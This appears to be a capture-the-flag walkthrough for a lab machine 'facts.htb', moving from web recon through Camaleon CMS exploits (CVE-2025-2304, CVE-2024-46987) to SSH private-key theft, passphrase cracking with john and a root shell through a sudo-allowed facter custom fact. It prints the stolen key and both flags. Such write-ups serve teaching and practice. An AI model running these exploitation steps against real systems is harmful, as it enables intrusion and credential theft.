## Recon

```bash
nmap -A 10.129.39.102
    22/tcp open  ssh
    80/tcp open  http
```
#### fuzzing
```bash
ffuf -u "http://facts.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt
feroxbuster --url http://facts.htb/ --depth 2 --wordlist /home/kali/Lists/SecLists/Discovery/Web-Content/common.txt
	/admin
	/admin.cgi
	/admin.pl
	/admin.php
```

It redirct us to /admin/login
Try default credentials
    admin, admin > " Username or Password incorrect"

Create new account
    jinx, FirstUser@01

discrovering the website
    # id=5
    # Camaleon CMS
    # Version 2.9.0
    search for exploit: "camaleon cms 2.9.0 cve"
        CVE-2025-2304 (Privilege Escalation)
        CVE-2024-46987 (Path Traversal)

    PE CVE: 
        https://github.com/whiteov3rflow/CVE-2025-2304-POC

    Path Traversal CVE:
        https://github.com/Goultarde/CVE-2024-46987

git clone both
## Exploitation

### PrivEsc (Administrator)
python3 exploit.py http://facts.htb/ jinxx FirstUser@01
[+] Login successful!
[*] User ID: 5
[*] Logging in as jinxx...
[*] Sending exploit...
[+] Exploit successful! Logout and login again for admin privileges.

- logout and login again
- Check profile
    Jinx Elkashawi - Administrator

### Path Traversal
python3 CVE-2024-46987.py -u http://facts.htb/ -l jinxx -p FirstUser@01 /etc/passwd

    trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
    william:x:1001:1001::/home/william:/bin/bash

Two users:
    trivia
    william

Google search:
    ssh files in linux
        authorized_keys
        id_ed25519

python3 CVE-2024-46987.py -u http://facts.htb/ -l jinxx -p FirstUser@01 /home/trivia/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEuBFzRKFdUY1A+sj1AvXsV0cCEMzfxYDn233RkNpBMc 

python3 CVE-2024-46987.py -u http://facts.htb/ -l jinxx -p FirstUser@01 /home/trivia/.ssh/id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABC/d+wxr1
G3pYhYZg27qd6SAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIEuBFzRKFdUY1A+s
j1AvXsV0cCEMzfxYDn233RkNpBMcAAAAoN2bCV84FqzAIW3CtAz0ooipr7fq1CkPKxClzM
mc7SM2je7imiiOkMjKrz83VITOlW/+Sk4qEP3DOjbU0PMqU8GMjcB8RiTuSV6q42SWVxCw
j6aYXL6eN0Qo5lGYzAaeKdpwd7HgKRQZtsXjEy8l3TG6I88ZxaNfiOGNsqi0MIw8DNdosX
OtZlm/RS0Vsdve4x3u38OjDO0E1OmWB620F90=
-----END OPENSSH PRIVATE KEY-----

## Gaining Access
save it on file
    `mousepad id_ed25519`

```bash
ssh2john id_ed25519 >> hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
	dragonballz     (id_ed25519)

ssh into trivia
ssh -i id_ed25519 trivia@facts.htb
    asks for password !!
    we need to change the file premessions
    chmod 600 id_ed25519

ssh -i id_ed25519 trivia@facts.htb
passphrase: dragonballz

ls -lah > nothing
let's back to the other user: william

cd ../william
ls
cat user.txt
```

> [!Flag]
> user: 93a1db05d3d6992c0a93fc66d7a3d95e
## Privilege Escalation

```bash
sudo -l
    /usr/bin/facter

cd /tmp
mkdir -p /tmp/custom

cat > exploit.sh << 'EOF'
#!/bin/bash
cat > /tmp/custom/shell.rb << 'EOR'
Facter.add('shell') do
setcode do
    exec('/bin/sh')
end
end
EOR
EOF

chmod +x exploit.sh
./exploit.sh && sudo /usr/bin/facter --custom-dir=/tmp/custom shell

whoami
	root
cd /root
ls
cat root.txt
```

> [!Flag]
root: 03ea5fdcca64bb5645f62943c3c9c6bf

